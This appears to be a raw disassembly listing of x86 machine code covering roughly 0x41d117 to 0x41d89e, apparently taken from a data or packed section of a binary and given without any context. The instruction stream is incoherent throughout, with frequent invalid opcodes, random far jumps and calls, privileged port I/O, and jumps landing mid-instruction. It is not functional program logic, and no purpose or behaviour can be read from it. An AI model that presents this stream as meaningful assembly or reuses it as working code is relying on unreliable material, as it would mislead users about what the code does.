  41d117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d118:	shr    DWORD PTR [esi],1
  41d11a:	popa   
  41d11b:	test   eax,0x65c02141
  41d120:	push   ss
  41d121:	or     al,0x79
  41d123:	lods   al,BYTE PTR ds:[esi]
  41d124:	arpl   WORD PTR [esi-0x40af145f],di
  41d12a:	push   eax
  41d12b:	loopne 0x41d103
  41d12d:	jge    0x41d19d
  41d12f:	jnp    0x41d12f
  41d131:	mov    cl,0x9a
  41d133:	or     DWORD PTR [ebp+0x57],eax
  41d136:	push   ebx
  41d137:	test   eax,ecx
  41d139:	pop    ss
  41d13a:	sti    
  41d13b:	mov    al,ds:0xb9940110
  41d140:	add    esp,edi
  41d142:	and    eax,0xe40cb690
  41d147:	(bad)  
  41d148:	mov    ebp,DWORD PTR [ecx-0x3f894639]
  41d14e:	cmp    ebx,DWORD PTR [edx]
  41d150:	(bad)  
  41d151:	jp     0x41d170
  41d153:	mov    ebx,ecx
  41d155:	cld    
  41d156:	xor    eax,0xfd3ba5aa
  41d15b:	pusha  
  41d15c:	gs push ds
  41d15e:	mov    ch,0xca
  41d160:	das    
  41d161:	push   edx
  41d162:	or     al,0xab
  41d164:	das    
  41d165:	adc    ah,BYTE PTR [ecx-0x78]
  41d168:	pushf  
  41d169:	je     0x41d178
  41d16b:	pop    esi
  41d16c:	loop   0x41d1b5
  41d16e:	mov    dl,0x93
  41d170:	(bad)  
  41d171:	mov    cl,0xb
  41d173:	sbb    al,0xa5
  41d175:	jae    0x41d1ca
  41d177:	xchg   ebx,eax
  41d178:	loop   0x41d1aa
  41d17a:	add    esp,ebp
  41d17c:	or     BYTE PTR [eax-0x78027e9b],al
  41d182:	mov    cl,0x7
  41d184:	push   cs
  41d185:	fsub   st(1),st
  41d187:	or     esi,DWORD PTR [edx-0x1946dd40]
  41d18d:	push   cs
  41d18e:	shl    BYTE PTR [edi+eiz*1],cl
  41d191:	mov    BYTE PTR [eax+ecx*8],ch
  41d194:	cs cli 
  41d196:	adc    BYTE PTR [ecx-0x320765a6],0x7
  41d19d:	xchg   esp,eax
  41d19e:	mov    al,ds:0xce56d86
  41d1a3:	sub    al,al
  41d1a5:	lea    edi,[edx+0x11c1311e]
  41d1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1ac:	(bad)  
  41d1ae:	loop   0x41d1fb
  41d1b0:	inc    edx
  41d1b1:	sub    cl,al
  41d1b3:	cmp    cl,al
  41d1b5:	das    
  41d1b6:	pop    ebp
  41d1b7:	dec    edx
  41d1b8:	loopne 0x41d1e9
  41d1ba:	(bad)  
  41d1bb:	out    dx,eax
  41d1bc:	outs   dx,BYTE PTR ds:[esi]
  41d1bd:	push   ebp
  41d1be:	adc    ebx,DWORD PTR [esi]
  41d1c0:	fwait
  41d1c1:	xor    DWORD PTR [ecx-0x4389ef1a],edi
  41d1c7:	pusha  
  41d1c8:	lea    ebp,ds:0xe498d890
  41d1ce:	lea    eax,[edi+0x10]
  41d1d1:	mov    ecx,0xae975eac
  41d1d6:	leave  
  41d1d7:	pop    ds
  41d1d8:	(bad)  [edi+ecx*2+0x5f948716]
  41d1df:	setle  BYTE PTR [ebx+0x49]
  41d1e3:	into   
  41d1e4:	jge    0x41d212
  41d1e6:	cmp    eax,0x8c8755b2
  41d1eb:	int    0x34
  41d1ed:	repnz or eax,0xb0e38fcc
  41d1f3:	cmc    
  41d1f4:	lods   al,BYTE PTR ds:[esi]
  41d1f5:	fnstsw WORD PTR [ebp+0x2b]
  41d1f8:	mov    al,ds:0xc7f75eb4
  41d1fd:	adc    BYTE PTR [ebp-0x14],bl
  41d200:	mov    dl,0x7e
  41d202:	into   
  41d203:	mov    esp,0xeac252c8
  41d208:	and    BYTE PTR [ebp-0x5ca70c5d],al
  41d20e:	dec    ebx
  41d20f:	stos   DWORD PTR es:[edi],eax
  41d210:	sub    al,0x16
  41d212:	cmp    BYTE PTR [esi+0x3945d6de],dl
  41d218:	or     dl,BYTE PTR [ecx+0x7]
  41d21b:	push   eax
  41d21c:	adc    BYTE PTR [eax+0xb],bl
  41d21f:	sbb    BYTE PTR [edx+ecx*1-0x2c],cl
  41d223:	aas    
  41d224:	iret   
  41d225:	inc    ebx
  41d226:	shl    BYTE PTR [edi],cl
  41d228:	mov    eax,ds:0xdc2cfa4c
  41d22d:	daa    
  41d22e:	lods   eax,DWORD PTR ds:[esi]
  41d22f:	or     eax,0x2e2edcaa
  41d234:	sub    esp,DWORD PTR [eax-0x1f]
  41d237:	mov    ds:0x6200df03,eax
  41d23c:	cs lahf 
  41d23e:	dec    ecx
  41d23f:	shr    DWORD PTR [ebx],1
  41d241:	sub    al,0x8
  41d243:	xor    ch,0x5e
  41d246:	out    0x10,eax
  41d248:	fld    QWORD PTR [esi+0x3]
  41d24b:	xchg   edx,eax
  41d24c:	mov    al,0x53
  41d24e:	rcl    edi,1
  41d250:	xchg   ebx,eax
  41d251:	ins    DWORD PTR es:[edi],dx
  41d252:	xor    eax,0x9a7a7114
  41d257:	jbe    0x41d227
  41d259:	push   ebp
  41d25a:	xchg   edi,eax
  41d25b:	sbb    ch,BYTE PTR [ebx+edi*1+0x29]
  41d25f:	lds    ecx,FWORD PTR [eax]
  41d261:	pop    ds
  41d262:	cmp    ch,ah
  41d264:	and    al,0x17
  41d266:	cld    
  41d267:	xchg   ebp,eax
  41d268:	lods   eax,DWORD PTR ds:[esi]
  41d269:	nop
  41d26a:	iret   
  41d26b:	(bad)  
  41d26d:	int3   
  41d26e:	mov    eax,0x6bf6a4a5
  41d273:	test   DWORD PTR [ebx+0x18],esi
  41d276:	int    0xe7
  41d278:	adc    al,0xbf
  41d27a:	and    DWORD PTR [ecx+0x16bad298],edx
  41d280:	test   al,0x2b
  41d282:	lods   al,BYTE PTR ds:[esi]
  41d283:	sub    eax,ebx
  41d285:	pop    esi
  41d286:	loope  0x41d290
  41d288:	cwde   
  41d289:	inc    esp
  41d28a:	mov    ebp,DWORD PTR [esi]
  41d28c:	and    eax,0x881a46cc
  41d291:	outs   dx,DWORD PTR ds:[esi]
  41d292:	ins    DWORD PTR es:[edi],dx
  41d293:	mov    ah,0xc6
  41d295:	push   ebx
  41d296:	or     DWORD PTR [ebx+ecx*8+0x76],esp
  41d29a:	cli    
  41d29b:	test   esp,ebx
  41d29d:	dec    esi
  41d29e:	xchg   DWORD PTR [edi],edi
  41d2a0:	jl     0x41d23f
  41d2a2:	cmp    ecx,ebp
  41d2a4:	ret    0x5e35
  41d2a7:	stos   DWORD PTR es:[edi],eax
  41d2a8:	fsin   
  41d2aa:	mov    esi,0x60279854
  41d2af:	mov    BYTE PTR [eax-0x4a380230],0x31
  41d2b6:	(bad)  
  41d2b7:	xor    BYTE PTR [edx],ch
  41d2b9:	bound  esi,QWORD PTR [edi]
  41d2bb:	jp     0x41d25f
  41d2bd:	lods   eax,DWORD PTR ds:[esi]
  41d2be:	sub    DWORD PTR [edi],edi
  41d2c0:	and    al,BYTE PTR [edx+0x74]
  41d2c3:	ins    DWORD PTR es:[edi],dx
  41d2c4:	fcmovbe st,st(7)
  41d2c6:	jp     0x41d309
  41d2c8:	or     BYTE PTR ds:0xef7c4118,0x8a
  41d2cf:	ins    DWORD PTR es:[edi],dx
  41d2d0:	jne    0x41d2a9
  41d2d2:	out    0xe2,al
  41d2d4:	push   ecx
  41d2d5:	in     eax,0xcb
  41d2d7:	fst    QWORD PTR [edi+0x10]
  41d2da:	mov    ds:0x5855af42,eax
  41d2df:	cdq    
  41d2e0:	cmp    eax,0xdec1b557
  41d2e5:	sub    bh,BYTE PTR [esi]
  41d2e7:	repnz aad 0xa6
  41d2ea:	aam    0x4d
  41d2ec:	scas   al,BYTE PTR es:[edi]
  41d2ed:	push   cs
  41d2ee:	popf   
  41d2ef:	sub    BYTE PTR [edx-0x38],bl
  41d2f2:	mov    ds:0x98f483bf,eax
  41d2f8:	xor    al,0x7f
  41d2fa:	push   edi
  41d2fb:	mov    DWORD PTR [edi+0x7a],eax
  41d2fe:	outs   dx,BYTE PTR ds:[esi]
  41d2ff:	push   ecx
  41d300:	out    0x4,al
  41d302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d303:	shl    edx,cl
  41d305:	pop    esi
  41d306:	sub    eax,ebx
  41d308:	cmp    edx,DWORD PTR [edi+ebp*4-0x6f0568f3]
  41d30f:	or     al,0x16
  41d311:	cmp    bh,dl
  41d313:	mov    dh,0xff
  41d315:	lahf   
  41d316:	mov    ecx,0x42d203eb
  41d31b:	sahf   
  41d31c:	dec    ebx
  41d31d:	and    al,0x4e
  41d31f:	js     0x41d2bc
  41d321:	push   esp
  41d322:	mov    edi,0xe272ae1c
  41d327:	inc    edx
  41d328:	fidivr DWORD PTR [eax]
  41d32a:	aas    
  41d32b:	push   esi
  41d32c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d32d:	xor    ecx,0x3f45cc75
  41d333:	out    dx,al
  41d334:	push   0xf8b7c0fa
  41d339:	xlat   BYTE PTR ds:[ebx]
  41d33a:	test   al,0x60
  41d33c:	mov    bl,0x76
  41d33e:	or     ecx,edi
  41d340:	sbb    dh,dl
  41d342:	cmp    eax,0xc255cca
  41d347:	(bad)  
  41d349:	jno    0x41d309
  41d34b:	xchg   eax,edx
  41d34d:	ror    BYTE PTR [ebp+0x7dd1da2c],cl
  41d353:	iret   
  41d354:	neg    BYTE PTR [ecx]
  41d356:	shl    DWORD PTR [esi],0x3f
  41d359:	mov    ebx,0x12df6bf3
  41d35e:	cmp    cl,0xf
  41d361:	mov    bh,0x3a
  41d363:	pop    esp
  41d364:	cli    
  41d365:	data16 mov al,0x1b
  41d368:	sahf   
  41d369:	(bad)  
  41d36a:	sbb    eax,0x4de5560c
  41d36f:	jl     0x41d341
  41d371:	jge    0x41d3d1
  41d373:	and    ah,BYTE PTR [eax+eax*1]
  41d376:	sub    DWORD PTR cs:[edx+0x689a9359],edi
  41d37d:	fadd   DWORD PTR [edx+eiz*8+0x26]
  41d381:	mov    cl,0x99
  41d383:	sub    ah,dh
  41d385:	dec    esp
  41d386:	add    eax,0x7a57389d
  41d38b:	or     BYTE PTR [eax+edx*8+0x54cdc6b8],0xaa
  41d393:	ins    BYTE PTR es:[edi],dx
  41d394:	es add al,0x7f
  41d397:	cmp    al,0x40
  41d399:	push   es
  41d39a:	ins    DWORD PTR es:[edi],dx
  41d39b:	jmp    0xed876b04
  41d3a0:	(bad)  
  41d3a1:	jmp    0x41d35d
  41d3a3:	lea    ecx,[eax+0x4db5afba]
  41d3a9:	sbb    al,0x77
  41d3ab:	xchg   ecx,eax
  41d3ac:	mov    ah,0xf7
  41d3ae:	cmp    BYTE PTR [edx+0x76],dl
  41d3b1:	(bad)  
  41d3b2:	fisttp DWORD PTR [ecx-0x4a]
  41d3b5:	test   eax,0x65c5a3e9
  41d3ba:	pop    ebp
  41d3bb:	mov    es,eax
  41d3bd:	cmp    cl,bh
  41d3bf:	ds cmp ecx,esp
  41d3c2:	dec    ebx
  41d3c3:	lahf   
  41d3c4:	add    al,0x14
  41d3c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3c7:	push   ecx
  41d3c8:	retf   0x63e4
  41d3cb:	add    DWORD PTR [ebx+esi*8+0x333c61f8],edx
  41d3d2:	shl    DWORD PTR [esi],cl
  41d3d4:	(bad)  
  41d3d5:	andnps xmm7,XMMWORD PTR [edi]
  41d3d8:	scas   eax,DWORD PTR es:[edi]
  41d3d9:	fld    DWORD PTR [eax+0x58d691fb]
  41d3df:	retf   
  41d3e0:	cli    
  41d3e1:	or     eax,0xf90869b3
  41d3e6:	jbe    0x41d3c0
  41d3e8:	pop    edx
  41d3e9:	add    ecx,DWORD PTR [esi]
  41d3eb:	jecxz  0x41d448
  41d3ed:	mov    ds:0x748b34d0,eax
  41d3f2:	(bad)  
  41d3f3:	int    0x58
  41d3f5:	jno    0x41d448
  41d3f7:	lock ss mov dh,0x9b
  41d3fb:	add    BYTE PTR [esi-0x52],ah
  41d3fe:	add    eax,0xd3de9cdd
  41d403:	clc    
  41d404:	mov    WORD PTR ds:0x2edb48b8,?
  41d40a:	sub    eax,0xe4f1587d
  41d40f:	sti    
  41d410:	cmp    BYTE PTR [esi-0x4],al
  41d413:	mov    esp,0x27ef1caa
  41d418:	sub    al,0xbc
  41d41a:	inc    ebp
  41d41b:	mov    eax,0xa87d855c
  41d420:	sbb    eax,0x4c31dc90
  41d425:	push   eax
  41d426:	dec    ebp
  41d427:	pop    ecx
  41d428:	popa   
  41d429:	psubusb mm0,QWORD PTR [ecx]
  41d42c:	mov    ebp,0x33d26bdf
  41d431:	pusha  
  41d432:	mov    esi,0x648671d1
  41d437:	cli    
  41d438:	daa    
  41d439:	jmp    0x1b7b:0x67d17ef7
  41d440:	pop    ebp
  41d441:	sar    ah,cl
  41d443:	cld    
  41d444:	mov    ds:0x92d53f0c,al
  41d449:	xchg   ebx,eax
  41d44a:	daa    
  41d44b:	sbb    esi,ebx
  41d44d:	inc    eax
  41d44e:	mov    esp,0x83023b17
  41d453:	scas   eax,DWORD PTR es:[edi]
  41d454:	cmp    bh,al
  41d456:	adc    eax,eax
  41d458:	inc    ebp
  41d459:	or     BYTE PTR [ebx+0x20],al
  41d45c:	mov    ch,0x11
  41d45e:	fisub  DWORD PTR [edx-0x7]
  41d461:	or     BYTE PTR [esi],dh
  41d463:	test   eax,edx
  41d465:	xchg   ebp,eax
  41d466:	imul   eax,DWORD PTR [eax+edi*8-0x69],0xffffff80
  41d46b:	imul   DWORD PTR [edi-0x9c45988]
  41d471:	mov    bh,0x7f
  41d473:	pushf  
  41d474:	jno    0x41d4cf
  41d476:	cmp    al,0x57
  41d478:	fisub  WORD PTR [eax]
  41d47a:	mov    DWORD PTR [esi+0x4282f6a],ebx
  41d480:	jle    0x41d489
  41d482:	dec    esi
  41d483:	fnsave [ebx-0x52]
  41d486:	xchg   BYTE PTR [ebx],bh
  41d488:	mov    dh,0x45
  41d48a:	ret    0xe209
  41d48d:	leave  
  41d48e:	xchg   ch,dh
  41d490:	dec    ebp
  41d491:	inc    edi
  41d492:	stos   DWORD PTR es:[edi],eax
  41d493:	sub    al,BYTE PTR [esi+esi*4+0x7c]
  41d497:	shl    DWORD PTR [ecx+0x24],0x9b
  41d49b:	push   0x27807567
  41d4a0:	and    al,0xae
  41d4a2:	cs ds xchg edi,eax
  41d4a5:	xchg   esp,eax
  41d4a6:	mov    ah,0x12
  41d4a8:	jne    0x41d480
  41d4aa:	(bad)  [edi+0x4f]
  41d4ad:	mov    ds:0x76fdb14f,eax
  41d4b2:	std    
  41d4b3:	jg     0x41d508
  41d4b5:	xchg   ebx,eax
  41d4b6:	jg     0x41d4d1
  41d4b8:	mov    ecx,0x959090ea
  41d4bd:	mul    BYTE PTR [ecx]
  41d4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4c0:	rcl    esp,1
  41d4c2:	and    eax,0x9893c9f3
  41d4c7:	xor    eax,0x71040094
  41d4cc:	pop    ss
  41d4cd:	pop    ss
  41d4ce:	pcmpeqd mm6,mm0
  41d4d1:	and    dh,BYTE PTR ds:0x5f0613a0
  41d4d7:	mov    cs,WORD PTR [edi+0x332c23f4]
  41d4dd:	les    edx,FWORD PTR [ebp+0x1d4c98ec]
  41d4e3:	adc    eax,0x54ce5df1
  41d4e8:	loope  0x41d544
  41d4ea:	jmp    0xe8b95216
  41d4ef:	ror    BYTE PTR [ebx-0x25],cl
  41d4f2:	das    
  41d4f3:	pushf  
  41d4f4:	add    al,0x4d
  41d4f6:	inc    edi
  41d4f7:	mov    gs,WORD PTR [ecx-0x74]
  41d4fa:	jg     0x41d480
  41d4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4fd:	push   ss
  41d4fe:	rcl    al,cl
  41d500:	mov    ds:0x9031089c,al
  41d505:	mov    edi,0x7a859d70
  41d50a:	imul   esi,DWORD PTR [eax+0x15bce1bf],0x95d9f4e0
  41d514:	pop    eax
  41d515:	inc    ebx
  41d516:	push   ecx
  41d517:	dec    edi
  41d518:	sbb    DWORD PTR [edx-0x7e],esp
  41d51b:	mov    ds:0x16b967dc,eax
  41d520:	mov    bh,BYTE PTR [edi-0xc]
  41d523:	call   0x4630:0xa35e4d50
  41d52a:	cmp    DWORD PTR [edi],0x4dc5d4c
  41d530:	aam    0x7d
  41d532:	dec    eax
  41d533:	xchg   ecx,eax
  41d534:	xor    bl,dl
  41d536:	sub    eax,0x164aeb9d
  41d53b:	sbb    BYTE PTR [esi-0x48],dl
  41d53e:	jmp    FWORD PTR [ecx+ebx*1-0x6b]
  41d542:	lds    eax,FWORD PTR [esi+edx*1]
  41d545:	repz push esp
  41d547:	cmc    
  41d548:	retf   0xb5c5
  41d54b:	call   0x23bd6855
  41d550:	or     BYTE PTR [ebx-0x54],dl
  41d553:	loope  0x41d56a
  41d555:	retf   0xc814
  41d558:	xor    eax,0x892cda9a
  41d55d:	popf   
  41d55e:	sahf   
  41d55f:	loope  0x41d58e
  41d561:	hlt    
  41d562:	(bad)  
  41d564:	imul   DWORD PTR [edx-0x7602d5f4]
  41d56a:	fcom   QWORD PTR [edx-0x24]
  41d56d:	jl     0x41d5e2
  41d56f:	pushf  
  41d570:	inc    esp
  41d571:	adc    ch,BYTE PTR [ebx-0x47c891ff]
  41d577:	inc    ebx
  41d578:	repnz mov edx,0x70e07b90
  41d57e:	cmc    
  41d57f:	jle    0x41d5b6
  41d581:	mov    es,esi
  41d583:	push   0xbc66c10
  41d588:	mov    edi,0x7707ec4a
  41d58d:	xchg   ebp,eax
  41d58e:	or     cl,BYTE PTR [ebx+0x690006b]
  41d594:	inc    edx
  41d595:	(bad)  
  41d596:	not    bh
  41d598:	fnstsw WORD PTR [ecx-0x7d48f678]
  41d59e:	lock out 0x92,al
  41d5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5a2:	mov    esp,0x631575b6
  41d5a7:	fist   WORD PTR es:[edi+eax*8]
  41d5ab:	shr    DWORD PTR [ecx+esi*4+0xaa34f10],0x69
  41d5b3:	fidiv  DWORD PTR [esi+0x2f]
  41d5b6:	test   BYTE PTR [edx-0x2d],al
  41d5b9:	or     eax,0x758ef4bd
  41d5be:	push   eax
  41d5bf:	out    dx,al
  41d5c0:	fisttp WORD PTR [edx-0x277ca57c]
  41d5c6:	and    eax,0x85e7950
  41d5cb:	ins    BYTE PTR es:[edi],dx
  41d5cc:	ficomp DWORD PTR [esi+0x1f]
  41d5cf:	rcr    DWORD PTR [ebx-0x28fe47ee],0xcb
  41d5d6:	imul   ebp,DWORD PTR [esi],0xae3a35b0
  41d5dc:	add    BYTE PTR [ebp-0x19],dh
  41d5df:	add    bl,bl
  41d5e1:	xchg   edi,eax
  41d5e2:	sbb    esi,DWORD PTR [ecx]
  41d5e4:	test   BYTE PTR [ebp-0x24],dh
  41d5e7:	outs   dx,BYTE PTR ds:[esi]
  41d5e8:	mov    ds:0x7f2ebcea,eax
  41d5ed:	jo     0x41d570
  41d5ef:	mov    ds:0x872fe01b,eax
  41d5f4:	pop    ebx
  41d5f5:	repnz pop ds
  41d5f7:	mov    gs,WORD PTR [edx]
  41d5f9:	pop    edx
  41d5fa:	jg     0x41d5c4
  41d5fc:	inc    esp
  41d5fd:	xor    BYTE PTR [esi-0x48],bl
  41d600:	retf   
  41d601:	dec    ebx
  41d602:	cdq    
  41d603:	je     0x41d648
  41d605:	cs aas 
  41d607:	sbb    BYTE PTR [ebp-0x75],dh
  41d60a:	pushf  
  41d60b:	xchg   eax,eax
  41d60d:	fdivr  QWORD PTR [edi+eax*4-0x49]
  41d611:	xor    DWORD PTR [ebx+0x62],esp
  41d614:	fistp  QWORD PTR [ebx-0x2d29971c]
  41d61a:	test   DWORD PTR es:[ebx],0x6464d203
  41d621:	dec    ecx
  41d622:	cs sti 
  41d624:	push   ecx
  41d625:	test   DWORD PTR [ecx+0x61],0x7eb32662
  41d62c:	xor    al,0x45
  41d62e:	adc    dl,dl
  41d630:	xor    edx,ecx
  41d632:	dec    ecx
  41d633:	shl    DWORD PTR [edx],cl
  41d635:	jb     0x41d696
  41d637:	or     ah,BYTE PTR [edi-0x1dbec30d]
  41d63d:	adc    BYTE PTR [edx],bh
  41d63f:	push   ebp
  41d640:	mov    al,0x0
  41d642:	stos   DWORD PTR es:[edi],eax
  41d643:	sub    al,0x82
  41d645:	mov    edi,0x183c0d56
  41d64a:	add    eax,0x631a18ee
  41d64f:	mov    WORD PTR gs:[ecx-0x24],?
  41d653:	fsub   DWORD PTR [esi+ecx*2+0x6c]
  41d657:	ds push 0xf3a0f972
  41d65d:	stc    
  41d65e:	popaw  
  41d660:	retf   
  41d661:	xchg   DWORD PTR [ebx+esi*2-0x6e2a4e3b],esp
  41d668:	loopne 0x41d67c
  41d66a:	rcr    DWORD PTR [ecx-0x4d],0xcb
  41d66e:	dec    ebp
  41d66f:	in     al,0x23
  41d671:	mov    ebp,0x9a713895
  41d676:	pop    edi
  41d677:	je     0x41d6bc
  41d679:	mov    esi,0x575c2315
  41d67e:	jp     0x41d6fe
  41d680:	adc    esi,ebx
  41d682:	pop    ebp
  41d683:	jl     0x41d6f0
  41d685:	mov    bh,0xad
  41d687:	js     0x41d641
  41d689:	adc    edi,DWORD PTR [esi]
  41d68b:	mov    edi,0x31b8e66c
  41d690:	xor    eax,0xc64b16b1
  41d695:	add    BYTE PTR [esi+esi*2],0xaf
  41d699:	movq   mm2,QWORD PTR [eax]
  41d69c:	test   al,0xb3
  41d69e:	setg   BYTE PTR [ecx-0x19]
  41d6a2:	inc    edx
  41d6a3:	or     al,0x3f
  41d6a5:	push   esi
  41d6a6:	mov    BYTE PTR [edx],ch
  41d6a8:	jecxz  0x41d681
  41d6aa:	fld    TBYTE PTR [ecx-0xb96f025]
  41d6b0:	ss (bad) 
  41d6b2:	sbb    esp,DWORD PTR [edi+0x15]
  41d6b5:	sbb    DWORD PTR [edi+ecx*4],edi
  41d6b8:	pop    ss
  41d6b9:	popa   
  41d6ba:	neg    BYTE PTR ds:0xbdef612d
  41d6c0:	clc    
  41d6c1:	test   eax,0x595f23a3
  41d6c6:	cdq    
  41d6c7:	mov    dl,BYTE PTR [eax+0x65949b6e]
  41d6cd:	call   0x911e:0xbcb1d8c4
  41d6d4:	cs inc eax
  41d6d6:	push   ecx
  41d6d7:	out    dx,eax
  41d6d8:	mov    bh,0x97
  41d6da:	es ss dec ecx
  41d6dd:	lds    esp,FWORD PTR ss:[ecx+ebp*8]
  41d6e1:	loopne 0x41d746
  41d6e3:	dec    edx
  41d6e4:	in     eax,dx
  41d6e5:	arpl   WORD PTR [eax+0x21],bx
  41d6e8:	out    0x8b,eax
  41d6ea:	ins    BYTE PTR es:[edi],dx
  41d6eb:	in     eax,0xa3
  41d6ed:	or     eax,DWORD PTR [esi+0x55]
  41d6f0:	jg     0x41d6cb
  41d6f2:	ror    BYTE PTR [eax],1
  41d6f4:	loop   0x41d739
  41d6f6:	cmp    BYTE PTR [edi-0x5fafe656],dl
  41d6fc:	jae    0x41d747
  41d6fe:	cli    
  41d6ff:	xchg   esp,eax
  41d700:	sbb    BYTE PTR [edi-0x58],ch
  41d703:	mov    ds:0x57ac90d3,al
  41d708:	and    ebx,esp
  41d70a:	push   ss
  41d70b:	jo     0x41d712
  41d70d:	(bad)  
  41d70e:	inc    DWORD PTR ds:0x8443327
  41d714:	push   esi
  41d715:	std    
  41d716:	add    esi,edx
  41d718:	and    ebp,DWORD PTR [ecx-0x35]
  41d71b:	push   ebp
  41d71c:	(bad)  
  41d71d:	mov    bl,0x8b
  41d71f:	loop   0x41d71e
  41d721:	ror    dl,1
  41d723:	test   al,0xf6
  41d725:	mov    eax,0xa7454722
  41d72a:	ret    
  41d72b:	inc    edi
  41d72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d72d:	adc    ch,cl
  41d72f:	gs out dx,al
  41d731:	imul   BYTE PTR [ebp+0x24]
  41d734:	jne    0x41d787
  41d736:	inc    esi
  41d737:	or     ebp,DWORD PTR [ecx+0x211c489a]
  41d73d:	daa    
  41d73e:	aas    
  41d73f:	mov    ch,0xf4
  41d741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d742:	ja     0x41d75e
  41d744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d745:	dec    edi
  41d746:	or     BYTE PTR [esi-0x2e3ae483],bl
  41d74c:	push   es
  41d74d:	(bad)  
  41d74e:	jnp    0x41d716
  41d750:	mov    cl,0x12
  41d752:	aaa    
  41d753:	mov    ah,0x82
  41d755:	ret    
  41d756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d757:	push   es
  41d758:	mov    eax,ds:0xabe5428b
  41d75d:	mov    eax,0x74d9bb85
  41d762:	jge    0x41d769
  41d764:	loopne 0x41d79a
  41d766:	push   edi
  41d767:	sbb    edi,DWORD PTR [edx+0x1e19da27]
  41d76d:	mov    ebx,0x62772635
  41d772:	out    0x49,al
  41d774:	cmp    BYTE PTR [esi],bl
  41d776:	push   0xbfc9f6d5
  41d77b:	fiadd  WORD PTR [edx+0xd]
  41d77e:	mov    dh,0x30
  41d781:	and    ebx,DWORD PTR [ebx-0x66]
  41d784:	mov    ah,0xac
  41d786:	ficom  DWORD PTR [edx]
  41d788:	cli    
  41d789:	dec    ecx
  41d78a:	add    BYTE PTR [esi-0x53c8bbee],bh
  41d790:	jmp    0x41d7cf
  41d792:	sbb    bl,ah
  41d794:	shl    BYTE PTR [eax-0x10],1
  41d797:	dec    ebx
  41d798:	sahf   
  41d799:	push   esi
  41d79a:	sbb    al,0x70
  41d79c:	out    dx,eax
  41d79d:	jecxz  0x41d78e
  41d79f:	jb     0x41d7e5
  41d7a1:	cmp    eax,esp
  41d7a3:	fcom   QWORD PTR [esi+0x3e]
  41d7a6:	gs add al,0xf
  41d7a9:	rcl    BYTE PTR [ecx],0xac
  41d7ac:	ret    
  41d7ad:	inc    ebp
  41d7ae:	sbb    edi,ebp
  41d7b0:	ret    0x340f
  41d7b3:	icebp  
  41d7b4:	aad    0x2f
  41d7b6:	loop   0x41d7e3
  41d7b8:	out    dx,eax
  41d7b9:	test   DWORD PTR [esp+edx*4],edx
  41d7bc:	aaa    
  41d7bd:	jg     0x41d7f8
  41d7bf:	aas    
  41d7c0:	retf   0x3776
  41d7c3:	pop    ebx
  41d7c4:	aaa    
  41d7c5:	shr    BYTE PTR [eax+0x12082502],cl
  41d7cb:	int    0xd6
  41d7cd:	imul   esp,DWORD PTR [edx-0x69],0x16
  41d7d1:	int3   
  41d7d2:	jo     0x41d75d
  41d7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7d5:	retf   
  41d7d6:	call   0x8be5f4f0
  41d7db:	ja     0x41d7f8
  41d7dd:	int    0xd9
  41d7df:	jae    0x41d82f
  41d7e1:	mov    al,0x93
  41d7e3:	sahf   
  41d7e4:	gs in  al,dx
  41d7e6:	fs nop
  41d7e8:	add    esi,eax
  41d7ea:	or     dh,BYTE PTR [ebx+0x5ff7baca]
  41d7f0:	xchg   esp,eax
  41d7f1:	addr16 in al,dx
  41d7f3:	mov    ds:0x6431c997,eax
  41d7f8:	or     eax,0xf13e4796
  41d7fd:	sar    BYTE PTR [esi+0x687e86d3],cl
  41d803:	(bad)  
  41d804:	mov    bl,0xd0
  41d806:	cmp    BYTE PTR [esi-0x26c5b88],cl
  41d80c:	aad    0xa5
  41d80e:	cmp    eax,0xa14c6776
  41d813:	mov    esi,0x73b5fecc
  41d818:	bound  esi,QWORD PTR [ebp+edi*8-0x7c2364ee]
  41d81f:	popa   
  41d820:	sbb    BYTE PTR cs:[ebx+0x750ba815],bl
  41d827:	inc    eax
  41d828:	or     ebx,DWORD PTR [esi-0x3c]
  41d82b:	in     eax,dx
  41d82c:	pop    ds
  41d82d:	sar    ecx,cl
  41d82f:	mov    bl,0xd0
  41d831:	fidivr DWORD PTR [ebp+0x7a]
  41d834:	cmp    BYTE PTR [ebx+0x17],ah
  41d837:	clc    
  41d838:	or     eax,0xb8ac0ff6
  41d83d:	sbb    BYTE PTR [esi],0x97
  41d840:	jmp    0x41d8a3
  41d842:	(bad)  
  41d843:	ror    bh,1
  41d845:	push   ebp
  41d846:	mov    ds:0xafecbbb9,al
  41d84b:	pop    edi
  41d84c:	arpl   WORD PTR [edx-0x6623a8b6],ax
  41d852:	in     eax,dx
  41d853:	aam    0x53
  41d855:	pop    edi
  41d856:	xor    DWORD PTR [esi+0x7a],0x18
  41d85a:	pop    esp
  41d85b:	lock fadd DWORD PTR gs:[esi]
  41d85f:	dec    esi
  41d860:	push   ss
  41d861:	sbb    DWORD PTR [edx+0x2],edx
  41d864:	adc    BYTE PTR es:[eax-0x3d],cl
  41d868:	rcl    DWORD PTR [eax-0x6c],cl
  41d86b:	bound  ebx,QWORD PTR [edi]
  41d86d:	int    0xb6
  41d86f:	push   ebp
  41d870:	inc    esi
  41d871:	xchg   ecx,eax
  41d872:	jle    0x41d88a
  41d874:	mov    esp,DWORD PTR [ebp-0x3d14b27c]
  41d87a:	std    
  41d87b:	and    eax,0x6b809cfc
  41d880:	adc    bh,BYTE PTR [ecx-0x4d3edb31]
  41d886:	sbb    ch,BYTE PTR [ebx+0x55]
  41d889:	push   ss
  41d88a:	out    0x5a,eax
  41d88c:	push   eax
  41d88d:	xor    al,0x80
  41d88f:	sub    al,0x69
  41d891:	aaa    
  41d892:	out    0x38,eax
  41d894:	push   ebx
  41d895:	mov    edi,0x8847471e
  41d89a:	cmp    dh,0x1
  41d89d:	push   cs
  41d89e:	jb     0x41d905
